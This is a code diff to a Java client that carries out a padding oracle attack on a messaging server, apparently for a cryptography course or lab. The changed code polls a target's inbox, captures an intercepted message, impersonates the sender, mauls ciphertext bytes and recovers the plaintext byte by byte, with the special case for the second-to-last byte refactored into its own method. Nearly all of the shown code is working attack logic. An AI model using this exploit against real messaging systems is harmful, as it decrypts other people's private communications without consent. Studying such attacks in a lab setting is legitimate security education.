@@ -61,27 +61,36 @@ public class MyClient {
             httpClient = HttpClientBuilder.create().build();
             rollRandomKeys();
 
+            System.out.println("Fishing for a message to " + target + "...");
+
             JSONArray messages = null;
             String sender = null;
+            String originalMessage = null;
+            int numbytes = -1;
             while(true) {
                 JSONObject obj = getRequest(serverurl + "/getMessages/" + target);
                 messages = obj.getJSONArray("messages");
                 if (messages.length() > 0) {
                     sender = messages.getJSONObject(0).getString("senderID");
-                    System.out.println("Caught a message to " + target + " from " + sender); //hax
-                    break;
+                    originalMessage = messages.getJSONObject(0).getString("message");
+                    numbytes = getByteLength(originalMessage);
+                    if (numbytes < 50) {
+                        System.out.println("Caught a suspected read receipt to " + target + " from " + sender);
+                    } else {
+                        System.out.println("Caught a substantial message to " + target + " from " + sender);
+                        break;
+                    }
                 }
             }
 
             clientuser = "" + sender.charAt(0);
             register(); //register as first letter of sender name. "a" for alice
-            String originalMessage = messages.getJSONObject(0).getString("message");
 
+            System.out.println("Looking for an accepted mauling (':' as 2nd char of message)...");
             int found = huntForByte(originalMessage, 17); //change the 17th byte until accepted by target (colon)
 
             System.out.println("Begin padding oracle attack!");
             String baseMessage = maulMessage(originalMessage, (byte) found, 17);
-            int numbytes = getByteLength(baseMessage);
 
             //This is so that 04 04 04 ?? succeeds only on 01 and not on 04
             baseMessage = maulMessage(baseMessage, (byte) 0, numbytes - 2);
@@ -93,26 +102,11 @@ public class MyClient {
             byte ogCipherByte;
             byte padByte;
             byte ogPlaintextByte;
-            byte hunted;
+            byte hunted = 0;
             for (int i = 1; i <= 16; i++) {
                 //special case for second to last since last could have been 0 or 1 to pass padding
                 if (i == 2) {
-                    int higher = processInbox();
-                    //last padbyte is either lower ^ 0 or lower ^ 1. Same as saying lower or higher
-                    int pen = huntForPenultimate(baseMessage, numbytes - 1, (byte) ((higher^1)^2) );
-                    if (pen < 0) { //higher was correct
-                        System.out.println("Correcting 0/1!!!!");
-                        //fix last iteration
-                        padByte = (byte) (higher ^ 1);
-                        ogCipherByte = getByte(originalMessage, numbytes - 1);
-                        ogPlaintextByte = (byte) (ogCipherByte ^ padByte);
-                        unknownpad[16-1] = padByte;
-                        plaintext[16-1] = ogPlaintextByte;
-
-                        hunted = (byte) (pen + 1000);
-                    } else {//lower is correct
-                        hunted = (byte) (pen - 1000);
-                    }
+                    hunted = specialCaseFor2(originalMessage, numbytes, baseMessage, unknownpad, plaintext, hunted);
                 }
                 else {
                     hunted = (byte) huntForByte(baseMessage, numbytes - i);
@@ -148,6 +142,32 @@ public class MyClient {
         } catch (Exception e) {
             e.printStackTrace();
             System.exit(0);
+        }
+    }
+
+    private static byte specialCaseFor2(String originalMessage, int numbytes, String baseMessage, byte[] unknownpad, byte[] plaintext, byte lower) throws IOException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException {
+        byte padByte;
+        byte ogCipherByte;
+        byte ogPlaintextByte;
+        processInbox(); //often second message is in the pipes
+        int higher = lower + 1;
+
+        System.out.println("Cleaned");
+        //last padbyte is either lower ^ 0 or lower ^ 1. Same as saying lower or higher
+        int pen = huntForPenultimate(baseMessage, numbytes - 1, (byte) ((higher^1)^2) );
+        if (pen < 0) { //higher was correct
+            System.out.println("Correcting 0/1!!!!");
+            //fix last iteration
+            padByte = (byte) (higher ^ 1);
+            ogCipherByte = getByte(originalMessage, numbytes - 1);
+            ogPlaintextByte = (byte) (ogCipherByte ^ padByte);
+            unknownpad[16-1] = padByte;
+            plaintext[16-1] = ogPlaintextByte;
+            System.out.println(ogPlaintextByte + " last plaintext changed");
+
+            return (byte) (pen + 1000);
+        } else {//lower is correct
+            return (byte) (pen - 1000);
         }
     }
 
